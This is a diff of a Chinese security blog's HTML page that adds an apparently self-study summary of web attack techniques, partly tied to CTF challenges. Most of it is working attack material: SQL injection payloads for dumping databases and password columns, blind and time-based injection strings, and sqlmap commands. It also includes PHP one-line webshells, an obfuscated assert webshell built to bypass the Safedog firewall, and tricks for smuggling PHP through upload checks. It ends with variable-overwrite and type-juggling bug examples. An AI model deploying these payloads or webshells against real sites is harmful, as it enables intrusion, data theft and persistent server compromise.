@@ -152,6 +152,205 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-11月份总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/11/29/11月份总结/">11月份总结</a>
+    </h1>
+  
+
+        
+        <a href="/2017/11/29/11月份总结/" class="archive-article-date">
+  	<time datetime="2017-11-29T10:47:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>sql注入：1.普通注入 2.盲注 3.sqlmap</li>
+</ul>
+<ul>
+<li>文件上传（包含）：一句话木马</li>
+</ul>
+<ul>
+<li>变量覆盖漏洞</li>
+</ul>
+<ul>
+<li>逻辑处理漏洞</li>
+</ul>
+<ul>
+<li>二次漏洞</li>
+</ul>
+<p>sql注入<br>-<br><em>1.普通注入</em></p>
+<p>一般情况：</p>
+<pre><code>一般用于尝试的语句 or 1=1--+   &apos;or 1=1--+   &quot;or 1=1--+    )or 1=1--+    &apos;)or 1=1--+     &quot;) or 1=1--+     &quot;))or 1=1--+ 
+一般的代码为： 
+$id=$_GET[&apos;id&apos;]; 
+$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; 
+用order by或者select判断字段数后
+获取当前数据库名：
+1′ union select 1,database() #
+爆出所有数据库：
+1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata #
+爆数据表 ：
+1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+爆字段：
+1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #
+爆数据：
+1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+</code></pre><p>宽字节注入：</p>
+<pre><code>set character_set_client=gbk 或者 magic_quotes_gpc=On （PHP6中删除了magic_quotes_gpc这个
+
+选项）时会导致一个编码转换的注入问题。此时单引号被转义成\&apos;,在注入时在单引号前加一个%df，%df和转
+
+义符 \ 即 %5c组合成%df%5c，就是“運”。用mysql_real_escape_string函数就可以抵御。
+</code></pre><p><em>2.盲注</em><br>构造逻辑判断的盲注：</p>
+<p>一般用到的函数：</p>
+<pre><code>left(database(),1)&gt;&apos;s&apos;
+ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+
+ascii(substr((select database()),1,1))=98
+ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 
+Ord()函数同 ascii()，将字符转为 ascii 值
+正则注入:select user() regexp &apos;^[a-z]&apos;;
+select user() regexp &apos;^ro&apos;;
+select * from users where id=1 and 1=(if((user() regexp &apos;^r&apos;),1,0)); 
+select * from users where id=1 and 1=(user() regexp&apos;^ri&apos;);
+like匹配注入：select user() like ‘ro%’
+</code></pre><p>基于报错的盲注：</p>
+<pre><code>一般形式：select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))
+</code></pre><p>延时注入：</p>
+<pre><code>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句，条件为假，执行sleep
+</code></pre><p>sqlmap</p>
+<pre><code>过注入点扫描确认信息           python sqlmap.py -u url --dbms mysql
+指定参数注入                  python sqlmap.py -u &quot;http://192.168.1.1/page.php?id=1&amp;cat=2&quot; -v 1 -p &quot;cat,id&quot;
+指定方法和post的数据 python sqlmap.py -u &quot;http://192.168.1.1/page.php&quot; --method &quot;POST&quot; -- data &quot;id=1&amp;cat=2&quot;
+指定cookie,可以注入一些需要登录的地址 python sqlmap.py -u &quot;http://192.168.1.1/page.php?id=1&amp;cat=2&quot; --cookie &quot;COOKIE_VALUE&quot;
+[部分sqlmap手册](http://localhost/sqlmap手册（部分）.txt)
+</code></pre><h2 id="文件上传（包含）：一句话木马"><a href="#文件上传（包含）：一句话木马" class="headerlink" title="文件上传（包含）：一句话木马"></a>文件上传（包含）：一句话木马</h2><pre><code>原型：eval($_GET[‘x’]);或者assert($_GET[‘x’]);中国菜刀添加，口令为x。
+
+上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：
+selectload_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’
+可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。 上述 my.ini当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来， 这个要平时积累。
+union+select+webshell的hex编码+into+outfile+‘网络物理路径\\a.php’
+导入外部文件报错：The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+</code></pre><p>%00截断：实验吧的题目 <a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="external">上传绕过</a></p>
+<p>图片php合并通过文件头检查</p>
+<pre><code>copy q.jpg/b+xxx.php/xxx.jpg
+</code></pre><p>字符串截取绕过安全狗</p>
+<pre><code>&lt;?php
+ $a = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,0,1);
+ $b = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,17,3);
+ $c = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,3,2);
+ $ss = $a.$b.$c;
+ $d  = $ss[0].$ss[2].$ss[2]; //ass
+ $dd = $ss[5].$ss[1].$ss[3]; //ert
+ $x = $d.$dd;//assert
+$x($_POST[&apos;x&apos;]);
+?&gt;
+</code></pre><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><pre><code>经常引发的函数：extract()  parse_str  import_request_variables(PHP5.4后取消)
+部分应用利用$$.传递外部参数不是用类似于$_GET[&apos;key&apos;]，而是把里面的key注册成一个变量key，由于没有验证该变量是否已经存在就直接赋值，所以导致已有的变量值会被覆盖。
+任意扩展名覆盖扩展名白名单列表
+</code></pre><p><strong>extract（）</strong>：从数组中的键值对注册成变量。int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</p>
+<pre><code>&lt;?php
+$b=3;
+$a=array(&apos;b&apos;=&gt;&apos;1&apos;); 
+extract($a); //$b=1
+print_r($b);
+?&gt;
+</code></pre><p> 输出1。没有指定参数，默认为EXTRA_OVERWRITE，覆盖原有同名变量的值。</p>
+<p><strong>parse_str</strong>：将字符串解析成多个变量  parse_str ( string $encoded_string [, array &amp;$result ] )<br>php手册：极度不建议在没有 result 参数的情况下使用此函数，并且在 PHP 7.2 中将废弃不设置参数的行为。</p>
+<pre><code>&lt;?php
+$b=1;
+parse_str(&apos;b=2&apos;);//$b=2,没有指定第参数，不放进输出数组。
+print_r($b);
+?&gt;
+</code></pre><p>输出2。</p>
+<p><strong>import_request_variables</strong>:将 GET／POST／Cookie 变量导入到全局作用域中</p>
+<pre><code>&lt;?php
+$b=1;
+import_request_variables(&apos;GP&apos;);//将 GET／POST变量导入到全局作用域中
+print_r($b);
+?&gt;
+</code></pre><p>url?b=2，输出2。</p>
+<p>$$注册变量</p>
+<pre><code>&lt;?php
+$a=1;
+foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request){
+    foreach($$_request as $_key=&gt; $_value){
+        echo $_key.&apos;&lt;br/&gt;&apos;;
+        $$_key=addlashes($_value);   //$a=addlashes($_value)
+    }
+}
+echo $a;
+?&gt;
+</code></pre><p>url?a=2，输出2。</p>
+<p><strong>漏洞防范</strong>：</p>
+<p>1.使用原始变量，直接用原生的$_GET,$_POST等数组变量操作。</p>
+<p>2.验证变量存在。</p>
+<h2 id="逻辑处理漏洞"><a href="#逻辑处理漏洞" class="headerlink" title="逻辑处理漏洞"></a>逻辑处理漏洞</h2><p>in_array(): 检查数组中是否存在某个值.</p>
+<p>一般形式in_array(‘b’,array(‘a’,’b’,’c’))</p>
+<pre><code>&lt;?php
+if(in_array( $_GET[&apos;typeid&apos;],array(1,2,3,4) ))
+{
+    $sql=&quot;select .... where typeid=&apos;&quot;.$_GET[&apos;typeid&apos;].&quot;&apos;&quot;;
+echo $sql;
+</code></pre><p>in_array()函数在比较之前会自动做类型转换。url?typeid=1’ union select…即可注入。</p>
+<p>is_numeric():判断一个变量是否为数字。</p>
+<pre><code>&lt;?php
+if(is_numeric($_GET[&apos;var&apos;]))
+{
+    $sql=“insert into xx values(&apos;xx&apos;,{$_GET[&apos;var&apos;]})”;
+    echo $sql;
+}
+</code></pre><p>存在XSS和hex编码的sql注入。</p>
+<h2 id="二次漏洞"><a href="#二次漏洞" class="headerlink" title="二次漏洞"></a>二次漏洞</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/11/29/11月份总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-11月总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -172,31 +371,78 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>·<strong>sql手注：1.报错注入<br>                2.盲注<br>       文件上传（包含）：一句话木马</strong><br>        变量覆盖漏洞<br>        逻辑处理漏洞<br>        二次漏洞</p>
-<p><em>盲注</em><br>-</p>
-<pre><code>(ascii(substr((select database()) ,1,1))) &lt; 116 --+
+        <ul>
+<li>sql注入：1.普通注入 2.盲注 3.sqlmap</li>
+</ul>
+<ul>
+<li>文件上传（包含）：一句话木马</li>
+</ul>
+<ul>
+<li>变量覆盖漏洞</li>
+</ul>
+<ul>
+<li>逻辑处理漏洞</li>
+</ul>
+<ul>
+<li>二次漏洞</li>
+</ul>
+<p>sql注入<br>-<br><em>1.普通注入</em></p>
+<p>一般情况：</p>
+<pre><code>一般用于尝试的语句 or 1=1--+   &apos;or 1=1--+   &quot;or 1=1--+    )or 1=1--+    &apos;)or 1=1--+     &quot;) or 1=1--+     &quot;))or 1=1--+ 
+一般的代码为： 
+$id=$_GET[&apos;id&apos;]; 
+$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; 
+用order by或者select判断字段数后
+获取当前数据库名：
+1′ union select 1,database() #
+爆出所有数据库：
+1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata #
+爆数据表 ：
+1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+爆字段：
+1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #
+爆数据：
+1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+</code></pre><p>宽字节注入：</p>
+<pre><code>set character_set_client=gbk 或者 magic_quotes_gpc=On （PHP6中删除了magic_quotes_gpc这个
 
-locus IN(&apos;AB086827&apos;,&apos;AF040764&apos;)
+选项）时会导致一个编码转换的注入问题。此时单引号被转义成\&apos;,在注入时在单引号前加一个%df，%df和转
+
+义符 \ 即 %5c组合成%df%5c，就是“運”。用mysql_real_escape_string函数就可以抵御。
+</code></pre><p><em>2.盲注</em><br>构造逻辑判断的盲注：</p>
+<p>一般用到的函数：</p>
+<pre><code>left(database(),1)&gt;&apos;s&apos;
+ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+
+ascii(substr((select database()),1,1))=98
+ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 
+Ord()函数同 ascii()，将字符转为 ascii 值
+正则注入:select user() regexp &apos;^[a-z]&apos;;
+select user() regexp &apos;^ro&apos;;
+select * from users where id=1 and 1=(if((user() regexp &apos;^r&apos;),1,0)); 
+select * from users where id=1 and 1=(user() regexp&apos;^ri&apos;);
+like匹配注入：select user() like ‘ro%’
+</code></pre><p>基于报错的盲注：</p>
+<pre><code>一般形式：select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))
+</code></pre><p>延时注入：</p>
+<pre><code>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句，条件为假，执行sleep
 </code></pre><p>sqlmap</p>
 <pre><code>过注入点扫描确认信息           python sqlmap.py -u url --dbms mysql
 指定参数注入                  python sqlmap.py -u &quot;http://192.168.1.1/page.php?id=1&amp;cat=2&quot; -v 1 -p &quot;cat,id&quot;
 指定方法和post的数据 python sqlmap.py -u &quot;http://192.168.1.1/page.php&quot; --method &quot;POST&quot; -- data &quot;id=1&amp;cat=2&quot;
 指定cookie,可以注入一些需要登录的地址 python sqlmap.py -u &quot;http://192.168.1.1/page.php?id=1&amp;cat=2&quot; --cookie &quot;COOKIE_VALUE&quot;
 [部分sqlmap手册](http://localhost/sqlmap手册（部分）.txt)
-</code></pre><h2 id="文件上传（包含）：一句话木马"><a href="#文件上传（包含）：一句话木马" class="headerlink" title="文件上传（包含）：一句话木马"></a>文件上传（包含）：一句话木马</h2><pre><code>原型：eval($_GET[‘x’]);或者assert($_GET[‘x’]);
+</code></pre><h2 id="文件上传（包含）：一句话木马"><a href="#文件上传（包含）：一句话木马" class="headerlink" title="文件上传（包含）：一句话木马"></a>文件上传（包含）：一句话木马</h2><pre><code>原型：eval($_GET[‘x’]);或者assert($_GET[‘x’]);中国菜刀添加，口令为x。
 
 上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：
 selectload_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’
 可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。 上述 my.ini当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来， 这个要平时积累。
 union+select+webshell的hex编码+into+outfile+‘网络物理路径\\a.php’
 导入外部文件报错：The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
-
-
-实验吧的题目 [上传绕过](http://ctf5.shiyanbar.com/web/upload/)
-图片php合并 copy q.jpg/b+xxx.php/xxx.jpg 通过文件头检查
-
-字符串截取绕过安全狗
-&lt;?php
+</code></pre><p>%00截断：实验吧的题目 <a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="external">上传绕过</a></p>
+<p>图片php合并通过文件头检查</p>
+<pre><code>copy q.jpg/b+xxx.php/xxx.jpg
+</code></pre><p>字符串截取绕过安全狗</p>
+<pre><code>&lt;?php
  $a = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,0,1);
  $b = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,17,3);
  $c = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,3,2);
@@ -206,7 +452,63 @@ union+select+webshell的hex编码+into+outfile+‘网络物理路径\\a.php’
  $x = $d.$dd;//assert
 $x($_POST[&apos;x&apos;]);
 ?&gt;
-</code></pre>
+</code></pre><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><pre><code>经常引发的函数：extract()  parse_str  import_request_variables(PHP5.4后取消)
+部分应用利用$$.传递外部参数不是用类似于$_GET[&apos;key&apos;]，而是把里面的key注册成一个变量key，由于没有验证该变量是否已经存在就直接赋值，所以导致已有的变量值会被覆盖。
+任意扩展名覆盖扩展名白名单列表
+</code></pre><p><strong>extract（）</strong>：从数组中的键值对注册成变量。int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</p>
+<pre><code>&lt;?php
+$b=3;
+$a=array(&apos;b&apos;=&gt;&apos;1&apos;); 
+extract($a); //$b=1
+print_r($b);
+?&gt;
+</code></pre><p> 输出1。没有指定参数，默认为EXTRA_OVERWRITE，覆盖原有同名变量的值。</p>
+<p><strong>parse_str</strong>：将字符串解析成多个变量  parse_str ( string $encoded_string [, array &amp;$result ] )<br>php手册：极度不建议在没有 result 参数的情况下使用此函数，并且在 PHP 7.2 中将废弃不设置参数的行为。</p>
+<pre><code>&lt;?php
+$b=1;
+parse_str(&apos;b=2&apos;);//$b=2,没有指定第参数，不放进输出数组。
+print_r($b);
+?&gt;
+</code></pre><p>输出2。</p>
+<p><strong>import_request_variables</strong>:将 GET／POST／Cookie 变量导入到全局作用域中</p>
+<pre><code>&lt;?php
+$b=1;
+import_request_variables(&apos;GP&apos;);//将 GET／POST变量导入到全局作用域中
+print_r($b);
+?&gt;
+</code></pre><p>url?b=2，输出2。</p>
+<p>$$注册变量</p>
+<pre><code>&lt;?php
+$a=1;
+foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request){
+    foreach($$_request as $_key=&gt; $_value){
+        echo $_key.&apos;&lt;br/&gt;&apos;;
+        $$_key=addlashes($_value);   //$a=addlashes($_value)
+    }
+}
+echo $a;
+?&gt;
+</code></pre><p>url?a=2，输出2。</p>
+<p><strong>漏洞防范</strong>：</p>
+<p>1.使用原始变量，直接用原生的$_GET,$_POST等数组变量操作。</p>
+<p>2.验证变量存在。</p>
+<h2 id="逻辑处理漏洞"><a href="#逻辑处理漏洞" class="headerlink" title="逻辑处理漏洞"></a>逻辑处理漏洞</h2><p>in_array(): 检查数组中是否存在某个值.</p>
+<p>一般形式in_array(‘b’,array(‘a’,’b’,’c’))</p>
+<pre><code>&lt;?php
+if(in_array( $_GET[&apos;typeid&apos;],array(1,2,3,4) ))
+{
+    $sql=&quot;select .... where typeid=&apos;&quot;.$_GET[&apos;typeid&apos;].&quot;&apos;&quot;;
+echo $sql;
+</code></pre><p>in_array()函数在比较之前会自动做类型转换。url?typeid=1’ union select…即可注入。</p>
+<p>is_numeric():判断一个变量是否为数字。</p>
+<pre><code>&lt;?php
+if(is_numeric($_GET[&apos;var&apos;]))
+{
+    $sql=“insert into xx values(&apos;xx&apos;,{$_GET[&apos;var&apos;]})”;
+    echo $sql;
+}
+</code></pre><p>存在XSS和hex编码的sql注入。</p>
+<h2 id="二次漏洞"><a href="#二次漏洞" class="headerlink" title="二次漏洞"></a>二次漏洞</h2>
       
 
       
